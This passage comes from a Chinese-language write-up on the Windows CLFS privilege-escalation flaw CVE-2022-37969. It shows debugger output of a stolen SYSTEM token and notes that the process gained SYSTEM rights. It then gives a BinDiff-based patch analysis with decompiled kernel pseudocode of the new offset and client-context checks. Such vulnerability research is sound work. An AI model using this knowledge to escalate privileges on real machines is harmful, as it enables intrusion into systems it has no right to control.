style="display:flex;"><span><span style="color:#ae81ff">02</span> S<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5</span><span style="color:#f92672">-</span><span style="color:#ae81ff">11</span></span></span><span style="display:flex;"><span> Attributes<span style="color:#f92672">-</span> Mandatory Default Enabled</span></span><span style="display:flex;"><span><span style="color:#ae81ff">03</span> S<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">16</span><span style="color:#f92672">-</span><span style="color:#ae81ff">16384</span></span></span><span style="display:flex;"><span> Attributes<span style="color:#f92672">-</span> GroupIntegrity GroupIntegrityEnabled</span></span><span style="display:flex;"><span>Primary Group: S<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5</span><span style="color:#f92672">-</span><span style="color:#ae81ff">18</span></span></span><span style="display:flex;"><span>Privs:</span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span><span style="color:#ae81ff">0x000000002</span> SeCreateTokenPrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">03</span><span style="color:#ae81ff">0x000000003</span> SeAssignPrimaryTokenPrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">0x000000004</span> SeLockMemoryPrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">0x000000005</span> SeIncreaseQuotaPrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">07</span><span style="color:#ae81ff">0x000000007</span> SeTcbPrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">08</span><span style="color:#ae81ff">0x000000008</span> SeSecurityPrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">09</span><span style="color:#ae81ff">0x000000009</span> SeTakeOwnershipPrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">10</span><span style="color:#ae81ff">0x00000000a</span> SeLoadDriverPrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">11</span><span style="color:#ae81ff">0x00000000b</span> SeSystemProfilePrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">12</span><span style="color:#ae81ff">0x00000000c</span> SeSystemtimePrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">13</span><span style="color:#ae81ff">0x00000000d</span> SeProfileSingleProcessPrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">14</span><span style="color:#ae81ff">0x00000000e</span> SeIncreaseBasePriorityPrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span><span style="color:#ae81ff">0x00000000f</span> SeCreatePagefilePrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">16</span><span style="color:#ae81ff">0x000000010</span> SeCreatePermanentPrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">17</span><span style="color:#ae81ff">0x000000011</span> SeBackupPrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">18</span><span style="color:#ae81ff">0x000000012</span> SeRestorePrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">19</span><span style="color:#ae81ff">0x000000013</span> SeShutdownPrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">20</span><span style="color:#ae81ff">0x000000014</span> SeDebugPrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">21</span><span style="color:#ae81ff">0x000000015</span> SeAuditPrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">22</span><span style="color:#ae81ff">0x000000016</span> SeSystemEnvironmentPrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">23</span><span style="color:#ae81ff">0x000000017</span> SeChangeNotifyPrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">25</span><span style="color:#ae81ff">0x000000019</span> SeUndockPrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">28</span><span style="color:#ae81ff">0x00000001c</span> SeManageVolumePrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">29</span><span style="color:#ae81ff">0x00000001d</span> SeImpersonatePrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">30</span><span style="color:#ae81ff">0x00000001e</span> SeCreateGlobalPrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">31</span><span style="color:#ae81ff">0x00000001f</span> SeTrustedCredManAccessPrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">32</span><span style="color:#ae81ff">0x000000020</span> SeRelabelPrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">33</span><span style="color:#ae81ff">0x000000021</span> SeIncreaseWorkingSetPrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">34</span><span style="color:#ae81ff">0x000000022</span> SeTimeZonePrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">35</span><span style="color:#ae81ff">0x000000023</span> SeCreateSymbolicLinkPrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">36</span><span style="color:#ae81ff">0x000000024</span> SeDelegateSessionUserImpersonatePrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span>Authentication ID: (<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">3e7</span>)</span></span><span style="display:flex;"><span>Impersonation Level: Anonymous</span></span><span style="display:flex;"><span>TokenType: Primary</span></span><span style="display:flex;"><span>Source:<span style="color:#f92672">*</span>SYSTEM<span style="color:#f92672">*</span> TokenFlags:<span style="color:#ae81ff">0x2000</span> ( Token in use )</span></span><span style="display:flex;"><span>Token ID:<span style="color:#ae81ff">3</span>eb ParentToken ID:<span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span>Modified ID: (<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">3</span>ec)</span></span><span style="display:flex;"><span>RestrictedSidCount:<span style="color:#ae81ff">0</span> RestrictedSids:<span style="color:#ae81ff">0x0000000000000000</span></span></span><span style="display:flex;"><span>OriginatingLogonSession:<span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span>PackageSid: (null)</span></span><span style="display:flex;"><span>CapabilityCount:<span style="color:#ae81ff">0</span> Capabilities:<span style="color:#ae81ff">0x0000000000000000</span></span></span><span style="display:flex;"><span>LowboxNumberEntry:<span style="color:#ae81ff">0x0000000000000000</span></span></span><span style="display:flex;"><span>Security Attributes:</span></span><span style="display:flex;"><span>Invalid AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION with no claims</span></span><span style="display:flex;"><span>Process Token TrustLevelSid: S<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">19</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1024</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8192</span></span></span></code></pre></div><p>替换完Token之后当前进程权限已经变为system权限</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/19.png"/></p><h3 id="补丁分析">补丁分析</h3><p><strong>WIN10</strong></p><p>使用Bindiff查看可知补丁主要修改了三个函数</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/20.png"/></p><p>在<code>CClfsBaseFilePersisted::LoadContainerQ</code>增加了对<code>SignatureOffset</code>的检查，使其不能超过<code>BASE_RECORD</code>大小，增加了对<code>cbSymbolZone</code> 的检查</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">LoadContainerQ</span>(</span></span><span style="display:flex;"><span> CClfsBaseFilePersisted<span style="color:#f92672">*</span>this,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span><span style="color:#66d9ef">const</span> a2,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> a3,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span> a4,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> a5,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">union</span> _CLS_LSN a6,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>a7,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>a8,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span><span style="color:#f92672">*</span>a9)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v16 );</span></span><span style="display:flex;"><span> v74<span style="color:#f92672">=</span><span style="color:#a6e22e">ExAcquireResourceExclusiveLite</span>(<span style="color:#f92672">*</span>((PERESOURCE<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>),<span style="color:#ae81ff">1u</span>);</span></span><span style="display:flex;"><span> BaseLogRecord<span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> _CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span>)CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetBaseLogRecord</span>(this);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( BaseLogRecord )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">Feature_Servicing_41154973__private_IsEnabled</span>() )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#f92672">**</span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v10<span style="color:#f92672">+</span><span style="color:#ae81ff">0x68</span>)<span style="color:#f92672">></span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>)(v10<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">9</span> )<span style="color:#75715e">// SignatureOffset</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> {</span></span><span style="display:flex;"><span> v20<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1072037875</span>;</span></span><span style="display:flex;"><span> v73<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1072037875</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_146;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">ULongLongAdd</span>((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span>)BaseLogRecord<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1338</span>,<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)BaseLogRecord<span style="color:#f92672">+</span><span style="color:#ae81ff">0x4CA</span>),<span style="color:#f92672">&amp;</span>v91)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> (<span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">ULongLongAdd</span>(v10, v21,<span style="color:#f92672">&amp;</span>v90)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span><span style="color:#75715e">// 将BASE_RECORD_HEADER和cbSymbolZone相加</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#f92672">||</span> v91<span style="color:#f92672">></span> v90 )<span style="color:#f92672">**</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v20<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1072037875</span>;</span></span><span style="display:flex;"><span> v73<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1072037875</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_146;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> Src<span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)BaseLogRecord<span style="color:#f92672">+</span><span style="color:#ae81ff">808</span>;</span></span><span style="display:flex;"><span> v79<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ContainerCount</span>(this);</span></span><span style="display:flex;"><span> v22<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v11<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x400</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v17<span style="color:#f92672">=</span> (CClfsContainer<span style="color:#f92672">*</span>)v11;</span></span></code></pre></div><p>在<code>CClfsBaseFile::GetSymbol</code>中增加了对<code>Client Context</code> 的检查，验证是否是正确的<code>Client Context</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetSymbol</span>(</span></span><span style="display:flex;"><span> PERESOURCE<span style="color:#f92672">*</span>this,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> a2,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> a3,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _CLFS_CLIENT_CONTEXT<span style="color:#f92672">**</span>a4)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span>...</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>v11 )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_12;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(v11<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>)<span style="color:#f92672">!=</span> a2 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1073741816</span>;</span></span><span style="display:flex;"><span>LABEL_13:</span></span><span style="display:flex;"><span> v16<span style="color:#f92672">=</span> v8;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_14;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span><span style="color:#a6e22e">ClfsQuadAlign</span>(<span style="color:#ae81ff">0x88u</span>);</span></span><span style="display:flex;"><span><span style="color:#f92672">**</span><span style="color:#a6e22e">if</span> (<span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)v13<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>)<span style="color:#f92672">!=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span>)(v15<span style="color:#f92672">+</span> v12)<span style="color:#75715e">// 验证Client Context上下文</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#f92672">||</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)v13<span style="color:#f92672">!=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1040322553</span></span></span><span style="display:flex;"><span><span style="color:#f92672">||</span><span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)v13<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">!=</span> v14</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span><span style="color:#f92672">*</span>((_BYTE<span style="color:#f92672">*</span>)v13<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">!=</span> a3<span style="color:#f92672">**</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span>LABEL_12:</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1072037875</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_13;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>a4<span style="color:#f92672">=</span> v13;</span></span></code></pre></div><p><strong>WIN11</strong></p><p>win11上补丁主要新增了以下几个函数</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">AllocOffsetNode</span>(_RTL_AVL_TABLE<span style="color:#f92672">*</span>,ulong)</span></span><span style="display:flex;"><span>CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">CompareGenericoffsets</span>(_RTL_AVL_TABLE<span style="color:#f92672">*</span>,<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>,<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)</span></span><span style="display:flex;"><span>CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateCheckifWithinSymbolZone</span>(ulong,_CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span>)</span></span><span style="display:flex;"><span>CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateClientContextOffsets</span>(_CLFS_VALIDATE_OFFSET_TABLE<span style="color:#f92672">*</span>,_CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span><span style="color:#66d9ef">const</span>)</span></span><span style="display:flex;"><span>CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateClientSymTblOffsets</span>(_CLFS_VALIDATE_OFFSET_TABLE<span style="color:#f92672">*</span>,_CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span><span style="color:#66d9ef">const</span>)</span></span><span style="display:flex;"><span>CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateContainerSymTblOffsets</span>(_CLFS_VALIDATE_OFFSET_TABLE<span style="color:#f92672">*</span>,_CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span><span style="color:#66d9ef">const</span>)</span></span><span style="display:flex;"><span>CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateProcessQNode</span>(_CLFS_VALIDATE_OFFSET_TABLE<span style="color:#f92672">*</span>,_CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span><span style="color:#66d9ef">const</span>,ulong,ulong<span style="color:#f92672">&amp;</span>,ulong<span style="color:#f92672">&amp;</span>)</span></span></code></pre></div><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/21.png"/></p><p>从<code>CClfsBaseFilePersisted::LoadContainerQ</code> 函数开始调用堆栈为：</p><p><code>CClfsBaseFilePersisted::LoadContainerQ→CClfsBaseFile::ValidateOffsets→CClfsBaseFile::ValidateClientContextOffsets→CClfsBaseFile::ValidateCheckifWithinSymbolZone</code></p><p>函数<code>CClfsBaseFile::ValidateOffsets</code> 伪代码如下：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateOffsets</span>(CClfsBaseFile<span style="color:#f92672">*</span>this,<span style="color:#66d9ef">struct</span> _CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span><span style="color:#66d9ef">const</span> a2)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> v4;<span style="color:#75715e">// r13</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span> v5;<span style="color:#75715e">// rbx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">struct</span> _RTL_AVL_TABLE<span style="color:#f92672">*</span>TableContext;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">struct</span> _CLFS_VALIDATE_OFFSET_TABLE<span style="color:#f92672">*</span>v7;<span style="color:#75715e">// rdi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>......</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> v4<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v5<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>i64);</span></span><span style="display:flex;"><span> TableContext<span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> _RTL_AVL_TABLE<span style="color:#f92672">*</span>)<span style="color:#a6e22e">ExAllocatePoolWithTag</span>(PagedPool,<span style="color:#ae81ff">0x68u</span>i64,<span style="color:#ae81ff">0x73666C43u</span>);</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> _CLFS_VALIDATE_OFFSET_TABLE<span style="color:#f92672">*</span>)TableContext;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>TableContext )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">3221225626</span>i64;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">RtlInitializeGenericTableAvl</span>(</span></span><span style="display:flex;"><span> TableContext,</span></span><span style="display:flex;"><span> CClfsBaseFile<span style="color:#f92672">::</span>CompareGenericoffsets,</span></span><span style="display:flex;"><span> CClfsBaseFile<span style="color:#f92672">::</span>AllocOffsetNode,</span></span><span style="display:flex;"><span> CClfsLogFcbPhysical<span style="color:#f92672">::</span>ReleaseLsnMap,</span></span><span style="display:flex;"><span> TableContext);</span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(v5<span style="color:#f92672">+</span><span style="color:#ae81ff">104</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v9<span style="color:#f92672">></span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>)(v5<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">9</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_25;</span></span><span style="display:flex;"><span> v10<span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)a2<span style="color:#f92672">+</span><span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)a2<span style="color:#f92672">+</span><span style="color:#ae81ff">1226</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">4920</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v10<span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)a2<span style="color:#f92672">+</span><span style="color:#ae81ff">4920</span><span style="color:#f92672">||</span> v5<span style="color:#f92672">+</span> v9<span style="color:#f92672">&lt;</span> v5<span style="color:#f92672">||</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span>)v10<span style="color:#f92672">></span> v5<span style="color:#f92672">+</span> v9 )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_25;</span></span><span style="display:flex;"><span> v11<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateContainerContextOffsets</span>(this, v7, a2);</span></span><span style="display:flex;"><span><span style="color:#f92672">**</span><span style="color:#a6e22e">if</span> ( v11<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> (v11<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateClientContextOffsets</span>(this, (<span style="color:#66d9ef">struct</span> _RTL_AVL_TABLE<span style="color:#f92672">*</span>)v7, a2), v11<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span>)</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> (v11<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateContainerSymTblOffsets</span>(this, v7, a2), v11<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span>)</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> (v11<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateClientSymTblOffsets</span>(this, v7, a2), v11<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span>) )<span style="color:#f92672">**</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span>LABEL_26:</span></span><span style="display:flex;"><span>.....</span></span><span style="display:flex;"><span>LABEL_35:</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ExFreePoolWithTag</span>(v7,<span style="color:#ae81ff">0</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v11;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>该代码中通过调用<code>CClfsBaseFile::ValidateClientContextOffsets CClfsBaseFile::ValidateClientSymTblOffsets CClfsBaseFile::ValidateContainerSymTblOffsets</code>检查Client Context Offset、Container Sybbol Table等偏移是否合法。</p><p><code>CClfsBaseFile::ValidateClientContextOffsets</code>伪代码如下，该代码循环遍历检查每个<code>Container</code>并调用<code>CClfsBaseFile::ValidateCheckifWithinSymbolZone</code>检查<code>cbSymbolZone</code>是否合法。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateClientContextOffsets</span>(</span></span><span style="display:flex;"><span> CClfsBaseFile<span style="color:#f92672">*</span>this,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _RTL_AVL_TABLE<span style="color:#f92672">*</span>a2,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span><span style="color:#66d9ef">const</span> a3)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> Symbol;<span style="color:#75715e">// ebx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v4;<span style="color:#75715e">// r14d</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v5;<span style="color:#75715e">// rdi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> v8;<span style="color:#75715e">// esi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> CClfsBaseFile<span style="color:#f92672">*</span>v9;<span style="color:#75715e">// rcx</span></span></span><span style="display:flex;"><span><span 